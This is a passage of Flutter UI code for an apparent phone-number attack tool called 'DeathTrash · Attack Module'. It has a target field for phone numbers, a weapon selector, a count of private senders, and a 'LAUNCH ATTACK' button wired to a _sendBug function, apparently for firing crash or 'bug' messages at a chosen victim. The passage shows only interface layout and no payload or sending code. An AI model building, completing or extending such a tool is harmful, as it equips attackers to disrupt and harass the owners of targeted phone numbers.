                                            mainAxisSize: MainAxisSize.min,
                                            children: [
                                              Icon(
                                                Icons.bolt_rounded,
                                                color: kDeathRed,
                                                size: 8,
                                              ),
                                              const SizedBox(width: 2),
                                              Text(
                                                widget.role.toUpperCase(),
                                                style: TextStyle(
                                                  color: kDeathRed,
                                                  fontSize: 7,
                                                  fontWeight: FontWeight.w700,
                                                  letterSpacing: 0.5,
                                                  fontFamily: 'monospace',
                                                ),
                                              ),
                                            ],
                                          ),
                                        ),
                                        const SizedBox(height: 4),
                                        Text(
                                          _bio.length > 25 ? '${_bio.substring(0, 25)}...' : _bio,
                                          style: TextStyle(
                                            color: Colors.white.withOpacity(0.2),
                                            fontSize: 9,
                                            fontFamily: 'monospace',
                                          ),
                                          maxLines: 1,
                                          overflow: TextOverflow.ellipsis,
                                        ),
                                      ],
                                    ),
                                  ),
                                  Icon(
                                    Icons.chevron_right_rounded,
                                    color: Colors.white.withOpacity(0.1),
                                    size: 16,
                                  ),
                                ],
                              ),
                            ),
                          ),

                          const SizedBox(height: 14),

                          // ─── VIDEO BANNER ───
                          if (isVideoInitialized && _chewieController != null)
                            Container(
                              decoration: BoxDecoration(
                                borderRadius: BorderRadius.circular(12),
                                border: Border.all(
                                  color: kDeathRed.withOpacity(0.12),
                                  width: 1,
                                ),
                              ),
                              child: ClipRRect(
                                borderRadius: BorderRadius.circular(12),
                                child: AspectRatio(
                                  aspectRatio: _videoController.value.aspectRatio,
                                  child: Chewie(controller: _chewieController!),
                                ),
                              ),
                            ),

                          const SizedBox(height: 14),

                          // ─── TARGET INPUT ───
                          Container(
                            decoration: BoxDecoration(
                              color: kDeathCardBg.withOpacity(0.5),
                              borderRadius: BorderRadius.circular(10),
                              border: Border.all(
                                color: kDeathBorder,
                                width: 1,
                              ),
                            ),
                            child: Row(
                              children: [
                                Padding(
                                  padding: const EdgeInsets.only(left: 12),
                                  child: Text(
                                    '>_',
                                    style: TextStyle(
                                      color: kDeathRed.withOpacity(0.5),
                                      fontSize: 10,
                                      fontFamily: 'monospace',
                                    ),
                                  ),
                                ),
                                Expanded(
                                  child: TextField(
                                    controller: targetController,
                                    style: TextStyle(
                                      color: Colors.white,
                                      fontSize: 11,
                                      fontFamily: 'monospace',
                                    ),
                                    cursorColor: kDeathRed,
                                    keyboardType: TextInputType.phone,
                                    decoration: InputDecoration(
                                      hintText: "+62xxxxxxxxxx",
                                      hintStyle: TextStyle(
                                        color: Colors.white.withOpacity(0.12),
                                        fontSize: 10,
                                        fontFamily: 'monospace',
                                      ),
                                      border: InputBorder.none,
                                      contentPadding: const EdgeInsets.symmetric(
                                        vertical: 10,
                                        horizontal: 10,
                                      ),
                                    ),
                                  ),
                                ),
                                GestureDetector(
                                  onTap: () => targetController.clear(),
                                  child: Container(
                                    padding: const EdgeInsets.all(6),
                                    margin: const EdgeInsets.only(right: 4),
                                    decoration: BoxDecoration(
                                      color: Colors.white.withOpacity(0.02),
                                      borderRadius: BorderRadius.circular(6),
                                    ),
                                    child: Icon(
                                      Icons.close_rounded,
                                      color: Colors.white.withOpacity(0.1),
                                      size: 12,
                                    ),
                                  ),
                                ),
                              ],
                            ),
                          ),

                          const SizedBox(height: 14),

                          // ─── WEAPON SELECTOR ───
                          _buildWeaponSelector(theme),

                          const SizedBox(height: 14),

                          // ─── SENDER INFO ───
                          Container(
                            padding: const EdgeInsets.all(12),
                            decoration: BoxDecoration(
                              color: kDeathCardBg.withOpacity(0.5),
                              borderRadius: BorderRadius.circular(10),
                              border: Border.all(
                                color: kDeathBorder,
                                width: 1,
                              ),
                            ),
                            child: Row(
                              mainAxisAlignment: MainAxisAlignment.spaceBetween,
                              children: [
                                Row(
                                  children: [
                                    Container(
                                      padding: const EdgeInsets.all(8),
                                      decoration: BoxDecoration(
                                        color: kDeathRed.withOpacity(0.06),
                                        borderRadius: BorderRadius.circular(8),
                                        border: Border.all(
                                          color: kDeathRed.withOpacity(0.06),
                                        ),
                                      ),
                                      child: Icon(
                                        Icons.phone_iphone_rounded,
                                        color: kDeathRed,
                                        size: 14,
                                      ),
                                    ),
                                    const SizedBox(width: 10),
                                    Column(
                                      crossAxisAlignment: CrossAxisAlignment.start,
                                      children: [
                                        Text(
                                          "PRIVATE SENDER",
                                          style: TextStyle(
                                            color: Colors.white.withOpacity(0.15),
                                            fontSize: 7,
                                            fontWeight: FontWeight.w700,
                                            letterSpacing: 0.8,
                                            fontFamily: 'monospace',
                                          ),
                                        ),
                                        Text(
                                          _isLoadingSenders ? "Loading..." : "$_totalPrivateSenders Active",
                                          style: TextStyle(
                                            color: Colors.white,
                                            fontSize: 14,
                                            fontWeight: FontWeight.w700,
                                            fontFamily: 'monospace',
                                          ),
                                        ),
                                      ],
                                    ),
                                  ],
                                ),
                                Container(
                                  padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
                                  decoration: BoxDecoration(
                                    color: _totalPrivateSenders > 0
                                        ? kDeathGreen.withOpacity(0.06)
                                        : kDeathRed.withOpacity(0.06),
                                    borderRadius: BorderRadius.circular(8),
                                    border: Border.all(
                                      color: _totalPrivateSenders > 0
                                          ? kDeathGreen.withOpacity(0.08)
                                          : kDeathRed.withOpacity(0.08),
                                    ),
                                  ),
                                  child: Text(
                                    _totalPrivateSenders > 0 ? "● READY" : "● EMPTY",
                                    style: TextStyle(
                                      color: _totalPrivateSenders > 0 ? kDeathGreen : kDeathRed,
                                      fontSize: 8,
                                      fontWeight: FontWeight.w700,
                                      letterSpacing: 0.5,
                                      fontFamily: 'monospace',
                                    ),
                                  ),
                                ),
                              ],
                            ),
                          ),

                          const SizedBox(height: 14),

                          // ─── LAUNCH BUTTON ───
                          AnimatedBuilder(
                            animation: _pulseController,
                            builder: (context, child) {
                              return Container(
                                width: double.infinity,
                                decoration: BoxDecoration(
                                  gradient: const LinearGradient(
                                    colors: [kDeathRed, kDeathRedDark],
                                  ),
                                  borderRadius: BorderRadius.circular(10),
                                  boxShadow: [
                                    BoxShadow(
                                      color: kDeathRed.withOpacity(0.15 * _pulseController.value),
                                      blurRadius: 20,
                                      spreadRadius: 1,
                                    ),
                                  ],
                                ),
                                child: ElevatedButton(
                                  onPressed: (isSending) ? null : _sendBug,
                                  style: ElevatedButton.styleFrom(
                                    backgroundColor: Colors.transparent,
                                    shadowColor: Colors.transparent,
                                    padding: const EdgeInsets.symmetric(vertical: 12),
                                    shape: RoundedRectangleBorder(
                                      borderRadius: BorderRadius.circular(10),
                                    ),
                                  ),
                                  child: isSending
                                      ? SizedBox(
                                          width: 20,
                                          height: 20,
                                          child: CircularProgressIndicator(
                                            color: Colors.white,
                                            strokeWidth: 2.5,
                                          ),
                                        )
                                      : Row(
                                          mainAxisAlignment: MainAxisAlignment.center,
                                          children: [
                                            Icon(
                                              Icons.rocket_launch_rounded,
                                              color: Colors.white,
                                              size: 16,
                                            ),
                                            const SizedBox(width: 8),
                                            Text(
                                              "LAUNCH ATTACK",
                                              style: TextStyle(
                                                color: Colors.white,
                                                fontWeight: FontWeight.w700,
                                                fontSize: 12,
                                                letterSpacing: 1.5,
                                                fontFamily: 'monospace',
                                              ),
                                            ),
                                          ],
                                        ),
                                ),
                              );
                            },
                          ),

                          if (responseMessage != null) ...[
                            const SizedBox(height: 12),
                            Container(
                              padding: const EdgeInsets.all(10),
                              decoration: BoxDecoration(
                                color: responseMessage!.contains('✅')
                                    ? kDeathGreen.withOpacity(0.06)
                                    : kDeathRed.withOpacity(0.06),
                                borderRadius: BorderRadius.circular(10),
                                border: Border.all(
                                  color: responseMessage!.contains('✅')
                                      ? kDeathGreen.withOpacity(0.08)
                                      : kDeathRed.withOpacity(0.08),
                                ),
                              ),
                              child: Row(
                                children: [
                                  Icon(
                                    responseMessage!.contains('✅')
                                        ? Icons.check_circle_rounded
                                        : Icons.error_rounded,
                                    color: responseMessage!.contains('✅')
                                        ? kDeathGreen
                                        : kDeathRed,
                                    size: 16,
                                  ),
                                  const SizedBox(width: 10),
                                  Expanded(
                                    child: Text(
                                      responseMessage!,
                                      style: TextStyle(
                                        color: responseMessage!.contains('✅')
                                            ? kDeathGreen
                                            : kDeathRed,
                                        fontWeight: FontWeight.w600,
                                        fontSize: 10,
                                        fontFamily: 'monospace',
                                      ),
                                    ),
                                  ),
                                ],
                              ),
                            ),
                          ],

                          const SizedBox(height: 16),

                          Container(
                            width: double.infinity,
                            padding: const EdgeInsets.symmetric(vertical: 10),
                            child: Column(
                              children: [
                                Container(
                                  height: 1,
                                  decoration: BoxDecoration(
                                    gradient: LinearGradient(
                                      colors: [
                                        Colors.transparent,
                                        kDeathRed.withOpacity(0.15),
                                        Colors.transparent,
                                      ],
                                    ),
                                  ),
                                ),
                                const SizedBox(height: 8),
                                ShaderMask(
                                  shaderCallback: (bounds) => const LinearGradient(
                                    colors: [kDeathRed, kDeathGold, kDeathRed],
                                    stops: [0.0, 0.5, 1.0],
                                  ).createShader(bounds),
                                  child: Text(
                                    'DEATHTRASH · ATTACK MODULE',
                                    style: TextStyle(
                                      color: Colors.white,
                                      fontSize: 10,
                                      fontWeight: FontWeight.w700,
                                      letterSpacing: 1.5,
                                      fontFamily: 'FontX',
                                    ),
                                  ),
                                ),
                                const SizedBox(height: 4),
                                Text(
                                  '// powered by @JustRxVz',
                                  style: TextStyle(
                                    color: Colors.white.withOpacity(0.1),
                                    fontSize: 7,
                                    fontFamily: 'monospace',
                                    letterSpacing: 0.5,
                                  ),
                                ),
                              ],
                            ),
                          ),
                        ],
                      ),
                    ),
                  ),
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }
}